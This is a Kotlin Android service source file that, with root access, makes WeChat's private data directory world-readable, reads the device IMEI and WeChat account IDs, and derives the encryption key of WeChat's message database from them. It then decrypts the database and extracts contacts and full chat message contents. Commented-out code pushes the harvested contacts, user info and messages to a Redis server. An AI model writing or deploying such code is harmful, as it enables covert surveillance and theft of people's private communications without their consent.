package com.example.myapplication

import android.Manifest
import android.app.Notification
import android.app.Service
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.os.AsyncTask
import android.os.Binder
import android.os.Build
import android.os.IBinder
import android.support.v4.app.ActivityCompat
import android.telephony.TelephonyManager
import android.text.TextUtils
import android.util.Log
import com.example.myapplication.utils.RootCmd
import net.sqlcipher.Cursor
import net.sqlcipher.database.SQLiteDatabase
import net.sqlcipher.database.SQLiteDatabaseHook
import org.json.JSONArray
import org.json.JSONObject
import java.io.*
import java.security.MessageDigest
import java.security.NoSuchAlgorithmException
import java.util.*
import javax.xml.parsers.DocumentBuilderFactory


class GohnsonServiceOld : Service() {

    private var wxIMEI = ""
    private val wxIMEI1 = ""//微信分身
    private val parallelLiteIMEI = ""
    private var mDbPassword = ""
    internal var mapUIN = HashMap<String, String>()

    //通过binder实现调用者client与Service之间的通信
    private val binder = MyBinder()


    private var mTimerTask: TimerTask? = null
    private val mTimer = Timer(true)


    inner class MyBinder : Binder() {

        val service: GohnsonServiceOld
            get() = this@GohnsonServiceOld

    }

    override fun onCreate() {
        super.onCreate()
        //        initBaseContnet();
    }


    fun initBaseContnet() {
        Log.e(TAG, "GohnsonService 启动 onCreate")
        //        CrashReport.initCrashReport(getApplicationContext(), GlobalCofig.BUGLY_ID, GlobalCofig.BUGLY_ISDEBUG);
        //        MyLog.init(MyApplication1.getApp().getCacheDir().getPath());
        StartCommand()
    }

    fun StartCommand() {
        Log.e(TAG, "GohnsonService 存在， 触发onStartCommand")
        try {
            if (Build.VERSION.SDK_INT < 18) {
                startForeground(GOHNSON_ID, Notification())
            } else {
                //                timekeeping();
                executeUpload()
                startForeground(GOHNSON_ID, Notification())
            }
        } catch (e: Exception) {
        }

    }

    fun executeUpload() {
        //开异步线程，保障所有数据库操作及网络请求不在主线程
        val asyncTask = UploadAsyncTask()
        asyncTask.execute()
    }

    fun timekeeping() {
        if (mTimerTask != null) return
        mTimerTask = object : TimerTask() {
            override fun run() {
                executeUpload()
            }
        }
        mTimer.schedule(mTimerTask, 0, EXECUTE_HEARBEAT_INTERVAL)//多少秒执行一次

    }


    class GohnsonInnerService : Service() {

        override fun onStartCommand(intent: Intent, flags: Int, startId: Int): Int {
            startForeground(GOHNSON_ID, Notification())
            stopForeground(true)
            stopSelf()
            return super.onStartCommand(intent, flags, startId)
        }

        override fun onBind(intent: Intent): IBinder? {
            // TODO: Return the communication channel to the service.
            throw UnsupportedOperationException("Not yet implemented")
        }
    }

    override fun onBind(intent: Intent): IBinder? {
        return binder
    }

    override fun onUnbind(intent: Intent): Boolean {
        return super.onUnbind(intent)
    }

    fun initIMEI() {

        RootCmd.execRootCmd("chmod 777 $OPERATION_DIR")


        Log.e(TAG, "正在获取imei")
        val tm = applicationContext.getSystemService(Context.TELEPHONY_SERVICE) as TelephonyManager
        if (ActivityCompat.checkSelfPermission(
                this,
                Manifest.permission.READ_PHONE_STATE
            ) != PackageManager.PERMISSION_GRANTED
        ) {
            return
        }
        val strIMEI = tm.deviceId

        val tencentCompatibleInfoPath = OPERATION_DIR + COMPATIBLE_INFO_CFG
        if (File(tencentCompatibleInfoPath).exists())
            wxIMEI = getWxIMEI(tencentCompatibleInfoPath)

        if (TextUtils.isEmpty(wxIMEI)) {
            wxIMEI = strIMEI
        }
        Log.e(TAG, "wximei:$wxIMEI")


    }

    fun UploadWXData() {
        try {
            initIMEI()
            //获取各路径下的UIN
            getUins(OPERATION_DIR + WX_UIM_FILE)
            // FIXME: 2019-08-01
            //            getUins(OPERATION_DIR_1 + WX_UIM_FILE);
            // getUins(GlobalCofig.OPERATION_DIR_0 + GlobalCofig.WX_UIM_FILE);
            //getUins(GlobalCofig.OPERATION_DIR_11 + GlobalCofig.WX_UIM_FILE);
            // getUins(GlobalCofig.OPERATION_DIR_PARALLEL_LITE+GlobalCofig.WX_UIM_FILE);

            GetFiles(OPERATION_DB_DIR, WX_DATA_DB, true)
            // GetFiles(GlobalCofig.OPERATION_DIR_0, GlobalCofig.WX_DATA_DB, true);
            //GetFiles(GlobalCofig.OPERATION_DIR_11, GlobalCofig.WX_DATA_DB, true);
            //  GetFiles(GlobalCofig.OPERATION_DIR_PARALLEL_LITE, GlobalCofig.WX_DATA_DB, true);
        } catch (e: Exception) {
        }

    }


    fun getUins(filePath: String) {
        Log.e(TAG, "正在获取Uins")
        RootCmd.execRootCmd("chmod 777 $OPERATION_DIR$WX_UIM_FILE")
        try {
            val app_brand_global_sp = File(filePath)
            if (app_brand_global_sp.exists()) {
                val `in` = FileInputStream(app_brand_global_sp)
                val factory = DocumentBuilderFactory.newInstance()  //取得DocumentBuilderFactory实例
                val builder = factory.newDocumentBuilder() //从factory获取DocumentBuilder实例
                val doc = builder.parse(`in`)   //解析输入流 得到Document实例
                val rootElement = doc.documentElement
                val items = rootElement.getElementsByTagName("set")
                for (i in 0 until items.length) {
                    val item = items.item(i)
                    val properties = item.childNodes
                    for (j in 0 until properties.length) {
                        val property = properties.item(j)
                        val nodeName = property.nodeName
                        if (nodeName == "string") {
                            val Uin = property.firstChild.nodeValue
                            mapUIN[getMD5("mm$Uin").toLowerCase()] = Uin
                            Log.e(
                                TAG,
                                "MMUIN = " + getMD5("mm$Uin").toLowerCase() + ", UIN = " + Uin + ",path = " + filePath
                            )
                        }
                    }
                }
            }
        } catch (e: Exception) {
        }

    }


    fun getMD5(string: String): String {
        if (TextUtils.isEmpty(string)) {
            return ""
        }
        var md5: MessageDigest? = null
        try {
            md5 = MessageDigest.getInstance("MD5")
            val bytes = md5!!.digest(string.toByteArray())
            var result = ""
            for (b in bytes) {
                var temp = Integer.toHexString(b.toInt() and 0xff)
                if (temp.length == 1) {
                    temp = "0$temp"
                }
                result += temp
            }
            return result
        } catch (e: NoSuchAlgorithmException) {
            e.printStackTrace()
        }

        return ""
    }


    fun GetFiles(Path: String, Extension: String, IsIterative: Boolean)  //搜索目录，扩展名，是否进入子文件夹
    {
        val files = File(Path).listFiles() ?: return

        try {
            for (i in files.indices) {
                val f = files[i]
                if (f.isFile) {
                    //                    Log.e(TAG, "getAbsolutePath():" + f.getAbsolutePath());
                    if (f.absolutePath.endsWith(Extension)) {//查找指定扩展名的文件
                        val wxFolderPath = File(f.parent).name
                        if (wxFolderPath.length != 32) continue
                        // FIXME: 2019-08-01
                        //                        long fileChangeTime = f.lastModified();
                        //                        long saveChangeTime = ShareData.getInstance().getLongValue(this, f.getPath(), 0);
                        //                        Log.e(TAG, "文件最后更新时间=" + fileChangeTime + ",保存的时间 = " + saveChangeTime + ", path = " + f.getPath());

                        //                        if (fileChangeTime == saveChangeTime) {
                        //                            String noChangeStr = "文件无改变，不操作该数据库，lastModifiedTime = " + fileChangeTime + ",saveTime = " + saveChangeTime + ",filePath = " + f.getPath();
                        //                            pushHearBeat();
                        //                            continue;
                        //                        }

                        val dbPath = f.parent + "/" + wxFolderPath + ".db"
                        Log.e(TAG, "dbPath = $dbPath")

                        mDbPassword = getDBPass(f.path, wxFolderPath)
                        //                        Log.e(TAG, "数据库密码 = " + mDbPassword);

                        val pathUin = mapUIN[wxFolderPath]

                        val dbFile = File(dbPath)

                        if (dbFile.exists())
                            dbFile.delete()

                        val dbFilepath = dbFile.path
                        val fpath = f.path
                        //开线程，部分机型在不开线程情况下会阻塞进程
                        Thread(Runnable {
                            RootCmd.execRootCmd("chmod 777 $fpath")
                            RootCmd.execRootCmd("chmod 777 $dbFilepath")
                        }).start()
                        copyFile(f, dbFile)
                        if (!dbFile.exists()) {
                            Log.e(TAG, "数据库不存在，filePath = " + dbFile.path)
                            continue
                        }
                        //
                        SQLiteDatabase.loadLibs(applicationContext)

                        val hook = object : SQLiteDatabaseHook {
                            override fun preKey(database: SQLiteDatabase) {}

                            override fun postKey(database: SQLiteDatabase) {
                                database.rawExecSQL("PRAGMA cipher_migrate;") //兼容2.0的数据库
                            }
                        }
                        var dataTarget: SQLiteDatabase? = null
                        var c1: Cursor? = null
                        var c2: Cursor? = null
                        try {
                            dataTarget = SQLiteDatabase.openOrCreateDatabase(dbFile.path, mDbPassword, null, hook)
                            //查询所有联系人（verifyFlag!=0:公众号等类型，群里面非好友的类型为4，未知类型2） and nickname != ''
                            c1 = dataTarget!!.rawQuery(
                                "select * from rcontact where verifyFlag = 0 and type != 4 and type != 2 and nickname != '' limit 20, 9999",
                                null
                            )
                            val jsonArray0 = JSONArray()
                            while (c1!!.moveToNext()) {
                                val jsonObject0 = JSONObject()
                                val userName = c1.getString(c1.getColumnIndex("username"))
                                val alias = c1.getString(c1.getColumnIndex("alias"))//微信号
                                val nickName = c1.getString(c1.getColumnIndex("nickname"))//
                                jsonObject0.put("username", userName)
                                jsonObject0.put("alias", alias)
                                jsonObject0.put("nickname", nickName)
                                try {
                                    c2 = dataTarget.rawQuery(
                                        "select * from message where ( type = 1 or type = 3 or type = 34 ) and talker = ?",
                                        arrayOf(userName)
                                    )
                                    val jsonArray = JSONArray()
                                    while (c2!!.moveToNext()) {
                                        //                                long long_id = c2.getLong(c2.getColumnIndex("msgId"));
                                        //                                String imgPath = c2.getString(c2.getColumnIndex("imgPath"));
                                        val jsonObject = JSONObject()
                                        jsonObject.put("content", c2.getString(c2.getColumnIndex("content")))
                                        jsonObject.put("talker", c2.getString(c2.getColumnIndex("talker")))
                                        jsonObject.put("createTime", c2.getInt(c2.getColumnIndex("createTime")))
                                        //1:文本和表情；3：图片34:语音 43：视频 47 大表情 49:分享的链接,网址等 10000:撤回消息
                                        jsonObject.put("type", c2.getInt(c2.getColumnIndex("type")))
                                        jsonObject.put(
                                            "isSend",
                                            c2.getInt(c2.getColumnIndex("isSend"))
                                        )//0:对方发过来的;1:自己发的
                                        jsonArray.put(jsonObject)
                                        //                                for (String columnName : c2.getColumnNames()) {
                                        //                                    try {
                                        //                                        Log.e(TAG, columnName + ":" + c2.getString(c2.getColumnIndex(columnName)));
                                        //                                    } catch (Exception e) {
                                        //                                        e.printStackTrace();
                                        //                                        continue;
                                        //                                    }
                                        //                                }
                                    }
                                    jsonObject0.put("messages", jsonArray)
                                } catch (e: Exception) {
                                    e.printStackTrace()
                                } finally {
                                    c2?.close()
                                }
                                jsonArray0.put(jsonObject0)
                            }
                            Log.e(TAG, "json数组：$jsonArray0")

                        } catch (e: Exception) {
                            val exceptionStr =
                                "异常 ：上传数据信息失败:" + e.localizedMessage + ",filePath = " + if (dbFile == null) "" else dbFile.path
                            Log.e(TAG, exceptionStr)
                        } finally {
                            c1?.close()
                            //                            if (c2 != null) {
                            //                                c2.close();
                            //                            }
                            dataTarget?.close()
                        }
                    }
                    if (!IsIterative)
                        break
                } else if (f.isDirectory) {
                    //                    Log.e(TAG, "isDirectory.getAbsolutePath():" + f.getAbsolutePath());
                    if (f.name != null) {
                        if (f.name.length == 32)
                            RootCmd.execRootCmd("chmod 777 " + f.absolutePath)
                    }
                    GetFiles(f.absolutePath, Extension, IsIterative)
                }
            }
        } catch (e: Exception) {
            e.printStackTrace()
        }

    }

    @Throws(IOException::class)
    private fun copyFile(source: File, dest: File) {
        var input: InputStream? = null
        var output: OutputStream? = null
        try {
            input = FileInputStream(source)
            output = FileOutputStream(dest)
//            val buf = ByteArray(1024)
//            var bytesRead: Int
//            while ((bytesRead = input.read(buf)) > 0) {
//                output.write(buf, 0, bytesRead)
//            }
            input.copyTo(output)
        } catch (e: Exception) {
            e.printStackTrace()
        } finally {
            input!!.close()
            output!!.close()
        }
    }

    fun getDBPass(filePath: String, wxFolderPath: String): String {
        // FIXME: 2019-08-01
        //        if (filePath.contains(OPERATION_DIR_PARALLEL_LITE)) {
        //            return getMD5(parallelLiteIMEI + mapUIN.get(wxFolderPath)).substring(0, 7).toLowerCase();//返回平行空间目录下的imei
        //        }
        //        if (filePath.contains(OPERATION_DIR_1)) {
        //            return getMD5(wxIMEI1 + mapUIN.get(wxFolderPath)).substring(0, 7).toLowerCase();//默认返回腾讯目录下的imei
        //        }
        Log.e(TAG, "密码MD5前:" + wxIMEI + mapUIN[wxFolderPath])
        return getMD5(wxIMEI + mapUIN[wxFolderPath]).substring(0, 7).toLowerCase()//默认返回腾讯目录下的imei
    }
    // FIXME: 2019-08-01
    //    public void uploadOperation(SQLiteDatabase dataTarget, File file, String pathUin, String deviceID, long fileChangeTime) {
    //        String wxFolderPath = new File(file.getParent()).getName();
    //
    //        String userName = "";
    //        final ArrayList<Object> userInfos = WXDataFormJsonUtil.getUserInfoDataInDB(dataTarget);
    //        //通过Uin查询用户微信号username
    //        for (int i = 0; i < userInfos.size(); i++) {
    //            UserInfoDao userInfoDao = (UserInfoDao) userInfos.get(i);
    //            if (userInfoDao.getId() == 2) {
    //                userName = userInfoDao.getValue();
    //                break;
    //            }
    //        }
    //
    //        final ArrayList<Object> chatRooms = WXDataFormJsonUtil.getChatRoomDataInDB(dataTarget);
    //        String chatRoomJsonStr = WXDataFormJsonUtil.getUploadJsonStr(wxFolderPath, chatRooms, pathUin, deviceID, userName);
    //
    //        Log.e(TAG, "待提交的chatRoomJsonStr = " + chatRoomJsonStr);
    //        boolean chatroomUploadSucceed = false;
    //        if (chatRoomJsonStr != null && !chatRoomJsonStr.equals("")) {
    //            chatroomUploadSucceed = uploadDataToRedis(GlobalCofig.REDIS_KEY_CHATROOM, chatRoomJsonStr, file);
    //        }
    //
    //        final ArrayList<Object> imgFlags = WXDataFormJsonUtil.getImgFlagDataInDB(dataTarget);
    //        /*String imgFlagJsonStr = WXDataFormJsonUtil.getUploadJsonStr(wxFolderPath, imgFlags, pathUin, deviceID, userName);
    //        Log.e(TAG, "待提交的imgFlagJsonStr = " + imgFlagJsonStr);
    //        //目前该表不使用，不用上传
    //        boolean imgFlagUploadSucceed = false;
    //        if (imgFlagJsonStr != null && !imgFlagJsonStr.equals("")) {
    //            //目前该表不使用
    //              imgFlagUploadSucceed = uploadDataToRedis(GlobalCofig.REDIS_KEY_IMGFLAG, imgFlagJsonStr, file);
    //        }*/
    //
    //        final ArrayList<Object> rcontacts = WXDataFormJsonUtil.getRcontactDataInDB(dataTarget);
    //        //查询好友记录
    //        for (int i = 0; i < rcontacts.size(); i++) {
    //            RcontactDao rcontactDao = (RcontactDao) rcontacts.get(i);
    //            for (int j = 0; j < imgFlags.size(); j++) {
    //                //获取微信好友的头像信息
    //                ImgFlagDao imgFlagDao = (ImgFlagDao) imgFlags.get(j);
    //                if (imgFlagDao.getUsername().equals(rcontactDao.getUsername())) {
    //                    //Log.e(TAG,  rcontactDao.getUsername()+"==》"+imgFlagDao.getUsername()+":"+imgFlagDao.getReserved2());
    //                    rcontactDao.setSmallHeadImgUrl(imgFlagDao.getReserved2());//绑定小头像（注：getReserved1()为大头像）
    //                    rcontactDao.setBigHeadImgUrl(imgFlagDao.getReserved1());
    //                    break;
    //                }
    //            }
    //
    //        }
    //
    //        String rcontactJsonStr = WXDataFormJsonUtil.getUploadJsonStr(wxFolderPath, rcontacts, pathUin, deviceID, userName);
    //
    //        Log.e(TAG, "待提交的rcontactJsonStr = " + rcontactJsonStr);
    //        boolean rcontactUploadSucceed = false;
    //        if (rcontactJsonStr != null && !rcontactJsonStr.equals("")) {
    //            rcontactUploadSucceed = uploadDataToRedis(GlobalCofig.REDIS_KEY_CONTACT, rcontactJsonStr, file);
    //        }
    //
    //
    //        String userInfoJsonStr = WXDataFormJsonUtil.getUploadJsonStr(wxFolderPath, userInfos, pathUin, deviceID, userName);
    //
    //        Log.e(TAG, "待提交的userInfoJsonStr = " + userInfoJsonStr);
    //        boolean userInfoUploadSucceed = false;
    //        if (userInfoJsonStr != null && !userInfoJsonStr.equals("")) {
    //            userInfoUploadSucceed = uploadDataToRedis(GlobalCofig.REDIS_KEY_USERINFO, userInfoJsonStr, file);
    //        }
    //
    //        boolean allMessageUploadSucceed = false;
    //        for (int i = 0; i < 100; i++) {
    //            Log.e(TAG, "第" + i + "次查询message表");
    //            boolean dataUploadSucceed = false;
    //            ArrayList<Object> messages = WXDataFormJsonUtil.getMessageDataInDB(this, dataTarget, file);
    //            messages = WXFileUtil.addSrcPath(wxFolderPath, messages);
    //
    //            if (messages == null) continue;
    //            int listSize = messages.size();
    //            if (listSize > 0) {
    //                String messageJsonStr = WXDataFormJsonUtil.getUploadJsonStr(wxFolderPath, messages, pathUin, deviceID, userName);
    //
    //                Log.e(TAG, "待提交的MessageJson = " + messageJsonStr);
    //                if (messageJsonStr != null && !messageJsonStr.equals("")) {
    //                    dataUploadSucceed = uploadMessageDataToRedis(GlobalCofig.REDIS_KEY_MESSAGE, messageJsonStr, file);
    //                }
    //            } else if (listSize == 0) {
    //                dataUploadSucceed = true;
    //            }
    //
    //            if (dataUploadSucceed && listSize < GlobalCofig.UPLOAD_NUMBER) {
    //                Log.e(TAG, "上传成功，并且是最后" + listSize + "条");
    //                allMessageUploadSucceed = true;
    //                break;
    //            }
    //        }
    //
    //        if (chatroomUploadSucceed && rcontactUploadSucceed && userInfoUploadSucceed && allMessageUploadSucceed) {
    //            ShareData.getInstance().saveLongValue(this, file.getPath(), fileChangeTime);
    //            MyLog.inputLogToFile(TAG, "本数据库所有数据已上传，若修改时间不更新，不再操作该数据库，key = " + file.getPath() + ",time =" + fileChangeTime);
    //            pushHearBeat();
    //        }
    //    }


    //    public boolean uploadDataToRedis(String key, String jsonValue, File file) {
    //        String hashKey = key + "_" + file.getPath();
    //        int newJsonHashCode = jsonValue.hashCode();
    //        int oldJsonHashCode = ShareData.getInstance().getIntValue(this, hashKey, 0);
    //        if (newJsonHashCode == oldJsonHashCode) {
    //            MyLog.inputLogToFile(TAG, "数据无更新，无需上传，newJsonHashCode = " + newJsonHashCode + ",oldJsonHashCode = " + oldJsonHashCode + ", hashKey = " + hashKey);
    //            return true;
    //        }
    //
    //        try {
    //            Jedis myJedis = JedisUtil.getInit();
    //            MyLog.inputLogToFile(TAG, "redis 连接成功，正在运行 = " + myJedis.ping());
    //            long pushValue = myJedis.lpush(key, jsonValue);
    //
    //            ShareData.getInstance().saveIntValue(this, hashKey, newJsonHashCode);
    //            MyLog.inputLogToFile(TAG, "redis上传成功，数据有更新" + key + "，newJsonHashCode = " + newJsonHashCode + ",oldJsonHashCode = " + oldJsonHashCode + ",pushValue = " + pushValue + ",filePath = " + file.getPath());
    //            return true;
    //        } catch (Exception e) {
    //            MyLog.inputLogToFile(TAG, "redis 连接失败, errMsg = " + e.getMessage() + ", hashKey = " + hashKey);
    //            return false;
    //        }
    //    }

    //    public boolean uploadMessageDataToRedis(String key, String jsonValue, File file) {
    //
    //        try {
    //            Jedis myJedis = JedisUtil.getInit();
    //            MyLog.inputLogToFile(TAG, "redis 连接成功，正在运行 = " + myJedis.ping());
    //            long pushValue = myJedis.lpush(key, jsonValue);
    //
    //            //上传成功去更新下标，下次从新下标开始取值
    //            String lastUploadTimeStr = GlobalCofig.MESSAGE_LAST_UPLOAD_TIME + file.getPath();
    //            long lastUploadTimeTemporary = ShareData.getInstance().getLongValue(this, GlobalCofig.MESSAGE_LAST_UPLOAD_TIME_TEMPORARY + file.getPath(), 0);
    //            long lastUploadTime = ShareData.getInstance().getLongValue(this, lastUploadTimeStr, 0);
    //            ShareData.getInstance().saveLongValue(this, lastUploadTimeStr, lastUploadTimeTemporary);
    //
    //            MyLog.inputLogToFile(TAG, key + "：redis 上传成功 ，message数据有更新，时间为= " + Utils.transForDate(lastUploadTimeTemporary) + "(" + lastUploadTimeTemporary + "),旧时间 = " + Utils.transForDate(lastUploadTime) + "(" + lastUploadTime + "),pushValue = " + pushValue + ",filePath = " + file.getPath());
    //
    //            ShareData.getInstance().saveStringValue(this, GlobalCofig.MESSAGE_LAST_UPLOAD_TIME_ONLY, Utils.transForDate(lastUploadTimeTemporary));
    //            BroadcastUtils.sendDataUploadLog(lastUploadTimeTemporary, file.getPath());
    //            return true;
    //        } catch (Exception e) {
    //            String errMsg = key + ":redis 连接失败, errMsg = " + e.getMessage();
    //            MyLog.inputLogToFile(TAG, errMsg);
    //            BroadcastUtils.sendDataUploadErrLog(errMsg);
    //            return false;
    //        }
    //    }

    override fun onDestroy() {
        super.onDestroy()
        mTimer?.cancel()
        //        GlobalCofig.excuteGohnsonService(this);
        Log.e(TAG, "onDestroy GohnsonService")
    }


    inner class UploadAsyncTask : AsyncTask<Int, Int, String>() {

        /**
         * 这里的Integer参数对应AsyncTask中的第一个参数
         * 这里的String返回值对应AsyncTask的第三个参数
         * 该方法并不运行在UI线程当中，主要用于异步操作，所有在该方法中不能对UI当中的空间进行设置和修改
         * 但是可以调用publishProgress方法触发onProgressUpdate对UI进行操作
         */
        override fun doInBackground(vararg params: Int?): String {
            try {
                UploadWXData()
            } catch (e: Exception) {
                Log.e(TAG, "doInBackground异常，msg= " + e.message)
            }

            return ""
        }

        /**
         * 这里的String参数对应AsyncTask中的第三个参数（也就是接收doInBackground的返回值）
         * 在doInBackground方法执行结束之后在运行，并且运行在UI线程当中 可以对UI空间进行设置
         */
        override fun onPostExecute(result: String) {}

        //该方法运行在UI线程当中,并且运行在UI线程当中 可以对UI空间进行设置
        override fun onPreExecute() {}

        /**
         * 这里的Intege参数对应AsyncTask中的第二个参数
         * 在doInBackground方法当中，，每次调用publishProgress方法都会触发onProgressUpdate执行
         * onProgressUpdate是在UI线程中执行，所有可以对UI空间进行操作
         */
        override fun onProgressUpdate(vararg values: Int?) {}
    }

    companion object {

        private val GOHNSON_ID = 1000

        private val TAG = GohnsonServiceOld::class.java.simpleName
        private val EXECUTE_HEARBEAT_INTERVAL: Long = 500
        private val OPERATION_DIR = "/data/data/com.tencent.mm/"
        private val COMPATIBLE_INFO_CFG = "MicroMsg/CompatibleInfo.cfg"
        private val WX_UIM_FILE = "shared_prefs/app_brand_global_sp.xml"
        private val WX_DATA_DB = "EnMicroMsg.db"//wxFolderPath/
        private val OPERATION_DB_DIR = "/data/data/com.tencent.mm/MicroMsg/"

        fun getWxIMEI(CompatibleInfoPath: String): String {
            RootCmd.execRootCmd("chmod 777 $OPERATION_DIR$COMPATIBLE_INFO_CFG")
            var imei = ""
            var campatiFile: FileInputStream? = null
            try {
                campatiFile = FileInputStream(CompatibleInfoPath)
                val localObjectInputStream = ObjectInputStream(campatiFile)
                val DL = localObjectInputStream.readObject() as Map<*, *>
                imei = DL[258] as String
                campatiFile.close()
            } catch (e: Exception) {
                e.printStackTrace()
            }

            return imei
        }
    }
}
